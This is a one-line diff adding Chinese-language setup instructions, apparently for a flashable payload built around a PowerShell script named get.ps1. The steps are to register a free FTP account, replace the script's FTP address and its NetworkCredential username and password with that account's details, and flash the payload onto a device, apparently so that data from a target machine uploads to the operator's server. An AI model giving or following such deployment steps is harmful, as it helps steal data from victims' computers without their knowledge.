@@ -1,0 +1,1 @@
+Ftp服务器可以在http://free.3v.do/这里申请免费空间，就可以免费获得一个100mb的FTP服务器 然后把get.ps1里的ftp://192.168.101.1/换成你申请到的Ftp服务器的地址 $ftp.Credentials = new-object System.Net.NetworkCredential("admin","admin") 这一行后面的第一个admin换成你FTP服务器的用户名，第二个admin换成你Ftp服务器的密码 然后直接刷入就可以了
